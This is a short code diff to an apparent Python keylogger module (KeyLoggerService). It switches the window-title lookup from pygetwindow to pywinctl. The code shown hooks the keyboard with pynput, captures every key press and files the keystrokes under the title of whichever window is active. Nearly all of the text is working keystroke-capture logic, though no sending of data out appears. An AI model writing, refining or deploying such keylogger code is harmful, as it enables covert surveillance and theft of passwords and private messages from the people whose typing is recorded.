@@ -1,6 +1,7 @@
+
 from pynput import keyboard
 from .i_key_logger_service import IKeloggerService
-import pygetwindow as gw
+from pywinctl import getActiveWindowTitle
 import threading
 
 # The Service
@@ -10,22 +11,21 @@ class KeyLoggerService(IKeloggerService):
 
     @property
     def __window_name(self):
-        current_screen = gw.getActiveWindow().title
+        current_screen = getActiveWindowTitle()
         
         if not current_screen:
             current_screen = "Desktop"
 
         return current_screen
 
-
     def on_press(self, key):
         try:
             formated = format(key.char)
         except:
             formated = format(key)
-        
+         
         current_screen = self.__window_name
-        
+
         if current_screen not in KeyLoggerService.storage:
             KeyLoggerService.storage[current_screen] = []
         KeyLoggerService.storage[current_screen].append(formated)
